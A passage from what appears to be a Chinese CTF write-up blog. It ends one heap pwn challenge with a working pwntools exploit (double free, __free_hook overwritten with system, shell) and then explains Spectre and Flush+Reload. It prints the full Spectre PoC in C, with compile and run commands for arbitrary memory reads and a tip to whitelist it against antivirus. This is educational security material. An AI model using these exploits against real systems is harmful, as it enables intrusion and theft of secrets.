ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(message, length)</span>:</span></span><br><span class="line">	io.sendafter(<span class="string">'your choice: '</span>, str(<span class="number">1</span>))</span><br><span class="line">	io.sendafter(<span class="string">'length of message:\n'</span>, str(length))</span><br><span class="line">	io.sendafter(<span class="string">'the message:\n'</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.sendafter(<span class="string">'your choice: '</span>, str(<span class="number">2</span>))</span><br><span class="line">	io.sendafter(<span class="string">'to delete:\n'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, message)</span>:</span></span><br><span class="line">	io.sendafter(<span class="string">'your choice: '</span>, str(<span class="number">3</span>))</span><br><span class="line">	io.sendafter(<span class="string">'to edit:\n'</span>, str(index))</span><br><span class="line">	io.sendafter(<span class="string">'edit the message:\n'</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span><span class="params">(index)</span>:</span></span><br><span class="line">	io.sendafter(<span class="string">'your choice: '</span>, str(<span class="number">4</span>))</span><br><span class="line">	io.sendafter(<span class="string">'to display:\n'</span>, str(index))</span><br><span class="line">	io.recvuntil(<span class="string">'message: '</span>)</span><br><span class="line">	<span class="keyword">return</span> io.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">free_hook_offset = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">fake_chunk = <span class="number">0x602060</span> - <span class="number">8</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">'aaaa'</span>, <span class="number">0x51</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="string">'bbbb'</span>, <span class="number">0x40</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="string">'cccc'</span>, <span class="number">0x40</span>)  <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(p64(fake_chunk), <span class="number">0x40</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="string">'dddd'</span>, <span class="number">0x40</span>)  <span class="comment">#4</span></span><br><span class="line">add(<span class="string">'eeee'</span>, <span class="number">0x40</span>)  <span class="comment">#5</span></span><br><span class="line">add(p64(puts_got), <span class="number">0x40</span>)  <span class="comment">#6</span></span><br><span class="line">puts_addr = display(<span class="number">0</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line">libc_addr = puts_addr - puts_offset</span><br><span class="line">free_hook_addr = libc_addr + free_hook_offset</span><br><span class="line">system_addr = libc_addr + system_offset</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts address: '</span> + hex(puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc address: '</span> + hex(libc_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'free hook address: '</span> + hex(free_hook_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>, p64(free_hook_addr))</span><br><span class="line">edit(<span class="number">0</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span>, <span class="number">0x10</span>)  <span class="comment">#7</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="学术前沿：幽灵"><a href="#学术前沿：幽灵" class="headerlink" title="学术前沿：幽灵"></a>学术前沿：幽灵</h3><h4 id="考点-9"><a href="#考点-9" class="headerlink" title="考点"></a>考点</h4><p>推测执行、缓存侧信道攻击</p>
<h4 id="出题动机"><a href="#出题动机" class="headerlink" title="出题动机"></a>出题动机</h4><p>这个题目不是传统的CTF Pwn题，没有堆、栈、格式化字符串以及IO_FILE等利用。幽灵和熔断是目前信息安全学术界的漏洞研究中最火的课题，这两类漏洞的特点在于，它们利用的不是软件层面的漏洞，而利用的是处理器设计上的缺陷，因此在处理器的设计没有大规模更新换代以前，几乎所有的计算机都可能受到影响。我有幸以幽灵漏洞为课题完成了我的本科毕业设计，这次出题也是我毕业设计的工作内容之一。</p>
<p>我希望能通过此题，让选手们能了解一下目前信息安全界最前沿的研究，从而拓宽知识面。幽灵和熔断代表了一类漏洞利用思想，我希望通过本题，将这种漏洞利用思想介绍给大家。</p>
<h4 id="预备知识-7"><a href="#预备知识-7" class="headerlink" title="预备知识"></a>预备知识</h4><p>（1）推测执行（Speculative Execution）</p>
<p>推测执行是微体系结构下处理器的一种效率优化措施，我先会介绍推测执行是如何提升效率的，然后会介绍推测执行在提升效率的同时带来的风险。</p>
<p>首先我们来看一看下面这段代码：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;a);</span><br><span class="line"><span class="keyword">if</span> (a &lt;= max_size)</span><br><span class="line">    a++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br></pre></td></tr></table></figure></p>
<p>先输入一个变量a，然后判断a有没有大于最大大小，没大于就自加1，否则就函数返回，这个逻辑是我们通常认为的逻辑。</p>
<p>现在我们要想一个问题，在判断<code>a &lt;= max_size</code>的时候，因为变量a刚刚才进行了一个写操作，因此a会存在于缓存中，但是<code>max_size</code>却不一定，很有可能只存在DRAM内存中。学过计算机组成原理的就知道，存储器是分级存储的，最快的是寄存器，其次是L1,L2,L3三级缓存，再次是DRAM内存，最后是硬盘等外部设备。访问越快的存储器造价也越高，因此相比之下设计的容量就越低，所以一般只有近期会经常用到的数据会保存在缓存中，其他的则会放入下级存储器中。</p>
<p>如果<code>max_size</code>只存在DRAM内存中，那么要判断<code>a &lt;= max_size</code>是否成立就需要等待<code>max_size</code>从DRAM中被读入CPU，这个I/O读写时间相对于CPU的执行来说效率是非常低下的，两者不在一个效率级别，如果CPU要等待I/O读写完后再执行后面的代码，则CPU再快也会受制于I/O读写速度。而一段程序中类似这样的I/O读写会执行几千几万遍，这种耽误的时间一旦累积就会对程序的性能带来显著的影响。</p>
<p>因此在20多年前，CPU就引入了<code>乱序执行</code>，它允许CPU不按程序本来的顺序执行，当出现I/O读写时不会忙等，会执行后面的代码。但是出现分支怎么办？如果I/O读写不完成，分支的走向也就不确定，这时CPU又引入了<code>分支预测</code>，它会根据该分支历史的跳转记录，预测一个大概率跳转的方向，在CPU忙等的时候沿着这个方向预先执行。乱序执行和分支预测的结合就是<code>推测执行</code>，推测执行的指令被称作为<code>瞬时指令（Transient Instruction）</code>，所谓瞬时，就是说这些瞬时指令所造成的影响只是瞬间存在的，不能长久维持。</p>
<p>这里需要着重强调的是，<strong>推测执行是CPU底层的特性，是程序员和用户不可见的，推测执行不会对程序员可见的所有状态做任何改变，所有程序员和用户永远认为程序是顺序执行的</strong>。等I/O读写完毕后，分支的走向就确定了，如果预测对了，推测执行将直接切换为实际执行，省下了大量的时间，如果预测错了，推测执行的所有状态信息将被丢弃，重新沿着正确的分支执行，虽然没省下时间，但相比于不引入推测执行，也没增加时间，因此横竖是赚，从统计学角度来看，引入推测执行是肯定能节省很多时间的。</p>
<p>根据该分支历史的走向预测该分支当前的走向是有依据的，依据的是计算机体系结构中提到的时间局部性原理和空间局部性原理，这个在循环结构中体现得非常典型，假设有一个100轮的<code>for</code>循环，那么99次都是选择继续循环，仅有最后一次是跳出循环，如果以历史的走向预测当前的走向，命中率可以达到99%，结合推测执行技术，大大节省了程序执行时间。</p>
<p>推测执行大大提升了程序性能，但早期的处理器设计者们没考虑到其中的安全隐患。前面说过推测执行不会对程序员可见的所有状态做任何改变，但缓存是程序员不可见的，推测执行是会影响缓存的，而且这种影响不会随着推测执行的丢弃而被抹去。虽然缓存是程序员不可见的，但是结合缓存侧信道攻击技术，是有可能通过一些侧信道信息还原缓存信息。</p>
<p>推测执行完全有可能执行实际执行中不会执行到的代码，如果攻击者能恶意训练分支预测器，诱使推测执行去执行一些实际执行中不可能执行的分支，再结合前面讲的缓存侧信道攻击技术，就会带来很大的安全隐患。</p>
<p>（2）Flush+Reload缓存侧信道攻击方法</p>
<p>缓存侧信道攻击有很多种，这次我只讲与主题最相关的Flush+Reload法。假设现在有一个单字节的秘密信息$k$，我们不能通过输出语句将其泄露，那么我们怎么通过缓存侧信道攻击的方法去泄露它呢？</p>
<p>首先我们要有一个探测数组<code>probe</code>并能够访问，而且还要有能力诱使程序执行类似于<code>temp = probe[k * 256]</code>这样的语句。首先我们将<code>probe</code>数组的全部数据都清除出缓存，这个称作<code>Flush</code>操作，然后诱导程序执行形如<code>temp = probe[k * 256]</code>这样的语句。接下来我们依次对<code>probe[0x00 * 256]</code>，<code>probe[0x01 * 256]</code>，<code>probe[0x02 * 256]</code>，…，<code>probe[0xFF * 256]</code>进行I/O读写，称作<code>Reload</code>操作。对每次I/O操作都要测量其读写时间，我们会发现，当进行<code>probe[k * 256]</code>的读写操作的时候，读写时间要远小于其他位置的读写时间，这是因为前面才执行过<code>temp = probe[k * 256]</code>，对<code>probe[k * 256]</code>有I/O读写，导致这个位置在缓存中，从缓存中读写数据的时间要远小于从DRAM中读写数据的时间。</p>
<p>因此进行Reload操作时，若发现<code>probe[m * 256]</code>的读写时间远小于其他位置的话，则可以判断秘密信息$k=m$。之所以下标要乘256，是因为缓存载入的单位不是按字节来的，是一个缓存组整体载入，所以乘256是保证每次的访问都对应不同的缓存组</p>
<p>（3）Spectre（幽灵）漏洞原理</p>
<p>下面这个程序段是一个典型地具有Spectre漏洞的代码片段。Spectre漏洞能造成的危害是，它通过缓存建立了一条攻击者到受害程序的隐蔽通道，突破了操作系统的进程隔离，可能泄露出受害进程内存空间的敏感信息，例如密钥、口令。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:   <span class="keyword">if</span> (x &lt; array1_size)</span><br><span class="line"><span class="number">2</span>:       y = array2[array1[x] * <span class="number">256</span>];</span><br></pre></td></tr></table></figure>
<p><strong>有漏洞是一码事，能利用是另一码事</strong>，有漏洞不一定能利用，要能成功利用这个漏洞造成实际危害，至少还需要满足以下条件：</p>
<ul>
<li>x可以被攻击者控制；</li>
<li>array1_size的值只存在于DRAM中；</li>
<li>受害程序具备有访问敏感信息的权限，例如不会触发段页错误及异常；</li>
<li>攻击者可以控制array2数组。</li>
</ul>
<p>首先先将<code>array2</code>数组的全部空间移出缓存。假设敏感信息是存在于首地址<code>secret</code>处的一个串，当攻击者控制x的值为<code>secret – array1</code>时，<code>array1[secret – array1]</code>就正好访问到敏感信息的首地址。但是如果控制x的值为<code>secret – array1</code>，很可能不能通过语句1的边界检查。<code>array1_size</code>是存在于DRAM中的，读取<code>array1_size</code>时CPU会推测执行后面的代码，如果能恶意地训练分支预测器预测到执行语句2这条路径，那么语句2就可以在推测执行中当作瞬时指令执行，<code>array1[x]</code>就可以读取到敏感信息的一个字节，记作<code>k</code>。由于推测执行是微体系结构层次下的操作，因此不会对程序员可见的状态做任何改变，然而缓存也是微体系结构的一部分，所以推测执行会改变缓存的状态，这个特性是Spectre漏洞利用的关键所在。由于读取了<code>array1[x]</code>，导致<code>k</code>被加载进缓存，那么<code>array2[k*256]</code>就可以通过缓存侧信道攻击将<code>k</code>的值还原出来。具体方法是，攻击者逐个Reload探测数组<code>array2[0x00*256]</code>, <code>array2[0x01*256]</code>, …, <code>array2[m*256]</code>, …, <code>array2[0xFF*256]</code>，并分别比较各自读取时间，若读取<code>array2[m * 256]</code>的时间明显小于读取其他数组元素的时间，则敏感信息<code>k=m</code>。接着将x赋值为<code>secret–array1+1</code>，重复上述过程即可还原敏感信息的第二个字节，依次类推可还原出完整的敏感信息。</p>
<p>具体来说，攻击者利用Spectre漏洞的攻击过程可以分为三个阶段：</p>
<ul>
<li>准备阶段。准备阶段需要完成两项工作，第一，训练分支预测器预测语句2的这条分支，因此需要在攻击开始前多次输入符合<code>x &lt; array1_size</code>条件的x，从而使推测执行会选择走语句2的分支；第二，利用Flush方法移出<code>array2</code>在缓存中的内容，为缓存侧信道攻击创造条件；</li>
<li>推测执行阶段。本阶段的目标就是通过恶意操控x，推测执行语句2，从而将敏感信息送入缓存；</li>
<li>缓存侧信道攻击。这也是攻击过程的最后阶段，通过对<code>array2</code>进行缓存侧信道攻击还原敏感信息在缓存中的状态，完成泄露。</li>
</ul>
<h4 id="解题过程-9"><a href="#解题过程-9" class="headerlink" title="解题过程"></a>解题过程</h4><p>本题到最后给了提示，即根据论文附录所给的POC代码依葫芦画瓢即可，因为这个题目就是对着这个POC代码改的，将功能性代码保留了下来，攻击过程需要自己完成。我们先来分析一下论文POC的漏洞利用思路</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdlib.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdint.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _MSC_VER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"intrin.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimizer(<span class="meta-string">"gt"</span>, on)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"x86intrin.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************</span></span><br><span class="line"><span class="comment">Victim code.</span></span><br><span class="line"><span class="comment">*************************/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> array1_size = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">uint8_t</span> unused1[<span class="number">64</span>];</span><br><span class="line"><span class="keyword">uint8_t</span> array1[<span class="number">160</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>&#125;;</span><br><span class="line"><span class="keyword">uint8_t</span> unused2[<span class="number">64</span>];</span><br><span class="line"><span class="keyword">uint8_t</span> array2[<span class="number">256</span> * <span class="number">512</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> secret[<span class="number">50</span>] = <span class="string">"THIS IS THE SECRET STRING TO LEAK"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">victim_function</span><span class="params">(<span class="keyword">size_t</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x &lt; array1_size) &#123;</span><br><span class="line">        temp &amp;= array2[array1[x] * <span class="number">512</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************</span></span><br><span class="line"><span class="comment">Analysis code</span></span><br><span class="line"><span class="comment">*************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHE_HIT_THRESHOLD (30)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readMemoryByte</span><span class="params">(<span class="keyword">size_t</span> malicious_x, <span class="keyword">uint8_t</span> value[<span class="number">2</span>], <span class="keyword">int</span> score[<span class="number">2</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> results[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> tries, i, j, k, mix_i, junk = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> training_x, x;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">uint64_t</span> time1, time2;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uint8_t</span> *addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        results[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(tries = <span class="number">999</span>; tries &gt; <span class="number">0</span>; tries--) &#123;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">            _mm_clflush(&amp;array2[i * <span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">        training_x = tries % array1_size;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">29</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            _mm_clflush(&amp;array1_size);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">volatile</span> <span class="keyword">int</span> z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++);</span><br><span class="line"></span><br><span class="line">            x = ((j % <span class="number">6</span>) - <span class="number">1</span>) &amp; ~<span class="number">0xFFFF</span>;</span><br><span class="line">            x = (x | (x &gt;&gt; <span class="number">16</span>));</span><br><span class="line">            x = training_x ^ (x &amp; (malicious_x ^ training_x));</span><br><span class="line"></span><br><span class="line">            victim_function(x);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            mix_i = ((i * <span class="number">167</span>) + <span class="number">13</span>) &amp; <span class="number">255</span>;</span><br><span class="line">            addr = &amp;array2[mix_i * <span class="number">512</span>];</span><br><span class="line">            time1 = __rdtscp(&amp;junk);</span><br><span class="line">            junk = *addr;</span><br><span class="line">            time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">            <span class="keyword">if</span>(time2 &lt;= CACHE_HIT_THRESHOLD &amp;&amp; mix_i != array1[tries % array1_size]) &#123;</span><br><span class="line">                results[mix_i]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        j = k = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(j &lt; <span class="number">0</span> || results[i] &gt;= results[j]) &#123;</span><br><span class="line">                k = j;</span><br><span class="line">                j = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(k &lt; <span class="number">0</span> || results[i] &gt;= results[k]) &#123;</span><br><span class="line">                k = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(results[j] &gt;= (<span class="number">2</span> * results[k] + <span class="number">5</span>) || (results[j] == <span class="number">2</span> &amp;&amp; results[k] == <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    results[<span class="number">0</span>] ^= junk;</span><br><span class="line">    value[<span class="number">0</span>] = (<span class="keyword">uint8_t</span>)j;</span><br><span class="line">    score[<span class="number">0</span>] = results[j];</span><br><span class="line">    value[<span class="number">1</span>] = (<span class="keyword">uint8_t</span>)k;</span><br><span class="line">    score[<span class="number">1</span>] = results[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> malicious_x = (<span class="keyword">size_t</span>)(secret - (<span class="keyword">char</span> *)array1);</span><br><span class="line">    <span class="keyword">int</span> i, score[<span class="number">2</span>], len = <span class="number">40</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> value[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(array2); i++)</span><br><span class="line">        array2[i] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(argc == <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">"%p"</span>, (<span class="keyword">void</span> **)(&amp;malicious_x));</span><br><span class="line">        malicious_x -= (<span class="keyword">size_t</span>)array1;</span><br><span class="line">        <span class="built_in">sscanf</span>(argv[<span class="number">2</span>], <span class="string">"%d"</span>, &amp;len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Reading %d bytes:\n"</span>, len);</span><br><span class="line">    <span class="keyword">while</span>(--len &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Reading at malicious_x = %p... "</span>, (<span class="keyword">void</span> *)malicious_x);</span><br><span class="line">        readMemoryByte(malicious_x++, value, score);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s: "</span>, (score[<span class="number">0</span>] &gt;= <span class="number">2</span> * score[<span class="number">1</span>] ? <span class="string">"Success"</span> : <span class="string">"Unclear"</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0x%02X='%c' score=%d    "</span>, value[<span class="number">0</span>], (value[<span class="number">0</span>] &gt; <span class="number">31</span> &amp;&amp; value[<span class="number">0</span>] &lt; <span class="number">127</span> ? value[<span class="number">0</span>] : <span class="string">'?'</span>), score[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span>(score[<span class="number">1</span>] &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"(second best: 0x%02X score=%d)\n"</span>, value[<span class="number">1</span>], score[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>CACHE_HIT_THRESHOLD</code>这个时间阈值需要根据不同的电脑性能做适当调整，我的电脑设置30的攻击效果是最佳的，一般情况下在30至100个CPU时钟周期范围内设定。设置好后直接</p>
<p><code>gcc -msse2 spectre.c -o spectre</code></p>
<p>编译即可，有些杀毒引擎会识别出Spectre攻击将其杀掉，注意设置白名单。直接执行即可发现程序通过侧信道攻击将<code>secret</code>数组泄露出来了。我们还可以加参数<code>泄露首地址</code>和<code>泄露长度</code>，类似于这样输入</p>
<p><code>./spectre 4010b0 40</code></p>
<p>可以实现任意地址读。</p>
<p>论文POC的利用思路是，对单个字节会尝试最多1000轮攻击尝试，并对单字节256个数引入评分机制。训练阶段和推测执行阶段绑定在一起共执行5组，每组会输入5个符合<code>x &lt; array1_size</code>的x来恶意训练分支预测器，1个真正的x将秘密信息送入缓存。在进行缓存侧信道攻击的时候，对于小于时间阈值的位置，该位置的评分加1，当评分第一的位置的评分已经跟评分第二的位置拉开显著的距离时，具体来说是，评分第一的位置评分大于评分第二的两倍还多5，或者当评分第一的评分为2时，评分第二的评分还是0，此时可以提前结束1000轮的循环，评分第一的位置就是要还原的秘密信息。</p>
<p>理论上来说，1轮攻击尝试就已经包含了完整的漏洞利用过程，为什么还要执行1000轮呢？这是因为缓存侧信道攻击的不可靠性。虽然理论上单轮攻击即可成功泄露信息，但是由于缓存是计算机中所有软件公用的，操作系统、其他进程都有可能影响缓存的状态，因此程序的当前运行环境对实验结果有很大的干扰。所以论文引入了多轮尝试和评分机制，通过多轮尝试的评分，从统计学的角度找出最有可能是秘密信息的字节，增强了实验结果的可靠性。</p>
<p>知道了论文POC利用的思路，我们再回到本题中。本题没有去掉符号表，而且菜单信息也有提示，所以每个功能都是很容易理解的。题目共提供了五个功能：</p>
<ul>
<li>设置恶意x用于提取秘密信息</li>
<li>设置训练用x用于训练分支预测器</li>
<li>提供了Flush操作，清除array2的缓存，为缓存侧信道攻击创造条件</li>
<li>提供了分支预测器训练操作</li>
<li>提供了Reload过程对每个位置的读取时间</li>
</ul>
<p>其实如果懂了Spectre漏洞原理的话，这个题目是相当简单的，因为所有的攻击模块都通过功能菜单直接提供了，选手只需要以正确的顺序串起来，然后将评分机制在自己的exp中实现就行了，完全可以对照着论文POC写。</p>
<p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'192.168.152.131'</span>, <span class="number">4444</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setMaliciousX</span><span 